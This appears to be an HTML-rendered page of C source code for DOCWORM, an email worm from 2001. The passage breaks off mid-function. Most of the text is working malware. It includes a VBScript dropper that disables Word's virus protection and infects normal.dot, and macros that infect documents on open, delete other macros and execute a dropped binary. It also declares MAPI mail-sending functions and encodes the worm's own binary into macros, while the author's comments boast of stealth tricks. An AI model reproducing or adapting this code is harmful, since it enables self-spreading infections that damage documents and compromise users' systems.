<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Bumdoc.a - DOCWORM.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
   DOCWORM
   by Bumblebee

   Copyright (c) 2001 Bumblebee &lt;bbbee@mailcity.com&gt;
   (aka I-Worm.Bumdoc huehehe, fuck off avp gays)

   THIS IS THE SOURCE CODE OF AN I-WORM. THE AUTHOR IS NOT
   RESPONSABILE OF ANY DAMAGES THAT MAY OCCUR DUE  TO  ITS
   BUILD AND UPON EXECUTION.

   I was bored and had to study and work and... well i did it in
   half a day.

   Peeps into unread mails to get addresses to send, kinda like
   Plage 2000 does but this time is not an endless loop. Due to
   this i check unread mails once, and i don't mark them coz until
   next boot i won't check mails again. Moreover i fix the damn
   bug i put in plage that makes it flood certain e-mail clients :)

   It uses the same trick of BRSHWORM to generate an stealth-error
   message: tries to load a fake dll and with the FormatMessage
   API shows the user the system cannot find a required component
   to run the app. The nice adventage of this fake message is
   it will be appear in the user's leng, and in fact is a genuine
   win error message ;)

   I've used C random stuff in all the worm, so all the files used
   by the worm (not including the macro dropper and the install
   lock file) have a random name.

   This is a little worm/virus that drops itself into normal.dot
   via a vbs script. The installed macros are full working macro virus
   that will infect other documents and drop and install the worm
   when a new normal.dot is infected from a document.

   The macro spawn system is quite the same i used in Lil'Devil, but this
   time the macro virus is more powerful and the encoded dropper is quite
   more optimized, but i'm still not a macro coder :/
   I've used fixed length in the macro encoding stuff. Due to this if the
   worm is greather this hardcoded size the encoded dropper in the macros
   will be wrong. So simbiosis alike stuff won't work fine with this
   worm, sorry :)

   As you can see the source is very small. The binary this time is
   8964 bytes. BRSHWORM has a little binary too. This time i linked it
   aganist msvcrt.dll instead crtdll.dll i used in BRSHWORM. Seems second
   library will be deprecated in the future so now i'm going to use
   msvcrt (even 1st win95 version has not). Why to carry with the run-time
   of your compiler when m$ has those installed for us to use them?
   And don't care the compiler you're using, i've done those two worms
   with an old BC++ and i've linked them with the so powerful ALINK.

   Here you have a very simple and effective i-worm to kill my spare
   (and no so spare) time.

   I hope you like it even it has not the innovative feel than BRSHWORM
   (aka i-worm.funnypics) has. The fact it's able to jump over word makes
   it has two ways to spread, thus less limited than BRSHWORM. I think
   it's possible to see DOCWORM itw... not BRSHWORM.

   the way of the bee

*/</span><span class="sc0">

</span><span class="sc9">#include&lt;windows.h&gt;
#include&lt;stdio.h&gt;
#include&lt;mapi.h&gt;
#include&lt;mem.h&gt;
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">copyright</span><span class="sc10">[]=</span><span class="sc6">"\n[ This is DOCWORM by Bumblebee ]\n"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">daemonFile</span><span class="sc10">[]=</span><span class="sc6">"\\xxxxxxxx.exe"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">vbsFile</span><span class="sc10">[]=</span><span class="sc6">"c:\\xxxxxxxx.vbs"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vbs</span><span class="sc10">[]=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc6">"' This is part of the DOCWORM Project\n"</span><span class="sc0">
</span><span class="sc6">"' the way of the bee\n"</span><span class="sc0">
</span><span class="sc6">"On Error Resume Next\n"</span><span class="sc0">
</span><span class="sc6">"set w=createobject(\"word.application\")\n"</span><span class="sc0">
</span><span class="sc6">"w.options.virusprotection=0\n"</span><span class="sc0">
</span><span class="sc6">"w.options.savenormalprompt=0\n"</span><span class="sc0">
</span><span class="sc6">"w.options.confirmconversions=0\n"</span><span class="sc0">
</span><span class="sc6">"if w.normaltemplate.vbproject.vbcomponents(1).name&lt;&gt;\"DOCWORM\" then\n"</span><span class="sc0">
</span><span class="sc6">"w.normaltemplate.vbproject.vbcomponents(1).codemodule."</span><span class="sc0">
</span><span class="sc6">"addfromfile(\""</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"\")\n"</span><span class="sc0">
</span><span class="sc6">"w.normaltemplate.vbproject.vbcomponents(1).name=\"DOCWORM\"\n"</span><span class="sc0">
</span><span class="sc6">"end if\n"</span><span class="sc0">
</span><span class="sc6">"w.application.quit\n"</span><span class="sc0">
</span><span class="sc6">"wscript.quit\n"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">macrosFile</span><span class="sc10">[]=</span><span class="sc6">"c:\\xxxxxxxx.sys"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">macros</span><span class="sc10">[]=</span><span class="sc0">

</span><span class="sc1">/* that's main sub of macro virus. It infects at document open. */</span><span class="sc0">
</span><span class="sc1">/* Case it infects normal.dot it drops the worm and execs it with */</span><span class="sc0">
</span><span class="sc1">/* install mode */</span><span class="sc0">

</span><span class="sc6">"Private Sub Document_Open()\n"</span><span class="sc0">
</span><span class="sc6">"' This is part of the DOCWORM Project\n"</span><span class="sc0">
</span><span class="sc6">"' the way of the bee\n"</span><span class="sc0">
</span><span class="sc6">"On Error Resume Next\n"</span><span class="sc0">
</span><span class="sc6">"Set ad = ActiveDocument.VBProject.VBComponents(1)\n"</span><span class="sc0">
</span><span class="sc6">"Set no = NormalTemplate.VBProject.VBComponents(1)\n"</span><span class="sc0">
</span><span class="sc6">"Set op = Options\n"</span><span class="sc0">
</span><span class="sc6">"op.VirusProtection = 0\n"</span><span class="sc0">
</span><span class="sc6">"op.ConfirmConversions = 0\n"</span><span class="sc0">
</span><span class="sc6">"op.SaveNormalPrompt = 0\n"</span><span class="sc0">
</span><span class="sc6">"If no.Name &lt;&gt; \"DOCWORM\" Then\n"</span><span class="sc0">
</span><span class="sc6">"no.Name = \"DOCWORM\"\n"</span><span class="sc0">
</span><span class="sc6">"install ad, no\n"</span><span class="sc0">
</span><span class="sc6">"drop\n"</span><span class="sc0">
</span><span class="sc6">"bumblespawn=shell(\"c:\\spawn.exe /i\",vbnormalfocus)\n"</span><span class="sc0">
</span><span class="sc6">"setattr (\"c:\\spawn.exe\"), 6\n"</span><span class="sc0">
</span><span class="sc6">"End If\n"</span><span class="sc0">
</span><span class="sc6">"If ad.Name &lt;&gt; \"DOCWORM\" Then\n"</span><span class="sc0">
</span><span class="sc6">"ad.Name = \"DOCWORM\"\n"</span><span class="sc0">
</span><span class="sc6">"install no, ad\n"</span><span class="sc0">
</span><span class="sc6">"ActiveDocument.Save\n"</span><span class="sc0">
</span><span class="sc6">"End If\n"</span><span class="sc0">
</span><span class="sc6">"End Sub\n\n"</span><span class="sc0">

</span><span class="sc1">/* this is sub is neat, it cleans all macros at destination item */</span><span class="sc0">
</span><span class="sc1">/* before add our lovely virus :) Let's say it's hostile to other */</span><span class="sc0">
</span><span class="sc1">/* macro virus hehehe */</span><span class="sc0">

</span><span class="sc6">"Private Sub install(src, dst)\n"</span><span class="sc0">
</span><span class="sc6">"Set odst = dst.CodeModule\n"</span><span class="sc0">
</span><span class="sc6">"Set osrc = src.CodeModule\n"</span><span class="sc0">
</span><span class="sc6">"odst.DeleteLines 1, odst.CountOfLines\n"</span><span class="sc0">
</span><span class="sc6">"odst.InsertLines 1, osrc.Lines(1, osrc.CountOfLines)\n"</span><span class="sc0">
</span><span class="sc6">"End Sub\n\n"</span><span class="sc0">

</span><span class="sc1">/* this damn stealth sometimes works, and sometimes not... shit of */</span><span class="sc0">
</span><span class="sc1">/* macros. The idea is to hang word (in fact it crashes at vbaxx.dll) */</span><span class="sc0">
</span><span class="sc1">/* when tools&gt;macro or tools&gt;vba editor are called. */</span><span class="sc0">

</span><span class="sc6">"private sub ToolsMacro()\n"</span><span class="sc0">
</span><span class="sc6">"ViewVBCode\n"</span><span class="sc0">
</span><span class="sc6">"end sub\n"</span><span class="sc0">
</span><span class="sc6">"\n"</span><span class="sc0">
</span><span class="sc6">"private sub ViewVBCode()\n"</span><span class="sc0">
</span><span class="sc6">"ToolsMacro\n"</span><span class="sc0">
</span><span class="sc6">"end sub\n"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#define DEFAULT         0
#define QUIET           1
#define INSTALL         2
#define WORDSPAWN       4
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc9">#define WSIZE           8964
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">RSP</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSENDMAIL</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLOGON</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLOGOFF</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MFINDNEXT</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MREADMAIL</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MFREEBUFFER</span><span class="sc10">)(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">spawnMail</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">main</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fd</span><span class="sc10">,*</span><span class="sc11">in</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">LPTSTR</span><span class="sc0"> </span><span class="sc11">commandLine</span><span class="sc10">,</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">,</span><span class="sc11">n</span><span class="sc10">,</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">status</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hkey</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">k32</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">RSP</span><span class="sc0"> </span><span class="sc11">RegSerPro</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc1">/* mmm, clean your fingerprints man */</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\spawn.exe"</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc1">/*
        default: install, word spawn, stealth message

        /w      word spawn
        /i      install
        /q      quiet
  */</span><span class="sc0">
  </span><span class="sc11">status</span><span class="sc10">=</span><span class="sc11">DEFAULT</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
  </span><span class="sc11">commandLine</span><span class="sc10">=</span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">commandLine</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">=</span><span class="sc11">commandLine</span><span class="sc10">;</span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'/'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">ptr</span><span class="sc10">++);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'/'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'q'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">status</span><span class="sc10">=</span><span class="sc11">QUIET</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'i'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">status</span><span class="sc10">=</span><span class="sc11">INSTALL</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'w'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">status</span><span class="sc10">=</span><span class="sc11">WORDSPAWN</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc1">/* infect normal.dot */</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">status</span><span class="sc10">==</span><span class="sc11">WORDSPAWN</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">status</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* use wininit.ini as lock file */</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\\wininit.ini"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"rt"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">vbsFile</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">3</span><span class="sc10">]=</span><span class="sc7">'a'</span><span class="sc10">+(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">26</span><span class="sc10">*</span><span class="sc11">rand</span><span class="sc10">()/</span><span class="sc11">RAND_MAX</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">macrosFile</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">3</span><span class="sc10">]=</span><span class="sc7">'a'</span><span class="sc10">+(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">26</span><span class="sc10">*</span><span class="sc11">rand</span><span class="sc10">()/</span><span class="sc11">RAND_MAX</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">macrosFile</span><span class="sc10">,</span><span class="sc6">"wt"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">fd</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc11">macros</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"private sub drop()\n"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"open \"c:\\spawn.exe\" for binary as #1\n"</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">file</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">WSIZE</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">in</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">WSIZE</span><span class="sc10">,</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">n</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;(</span><span class="sc11">WSIZE</span><span class="sc10">/</span><span class="sc4">512</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">&lt;</span><span class="sc11">WSIZE</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"d%i\n"</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"close #1\nend sub\n"</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;(</span><span class="sc11">WSIZE</span><span class="sc10">/</span><span class="sc4">512</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">&lt;</span><span class="sc11">WSIZE</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"\nprivate sub d%i()\n"</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">&lt;</span><span class="sc11">WSIZE</span><span class="sc10">;</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"b$="</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">m</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">64</span><span class="sc10">;</span><span class="sc11">k</span><span class="sc10">++,</span><span class="sc11">n</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">==</span><span class="sc11">WSIZE</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">63</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc1">/* optimize a bit */</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]&gt;</span><span class="sc7">'a'</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]&lt;</span><span class="sc7">'z'</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                                           </span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]&gt;</span><span class="sc7">'A'</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]&lt;</span><span class="sc7">'Z'</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                                           </span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]&gt;</span><span class="sc7">'0'</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]&lt;</span><span class="sc7">'9'</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">m</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"\"%c"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]);</span><span class="sc0">
                                                        </span><span class="sc11">m</span><span class="sc10">++;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
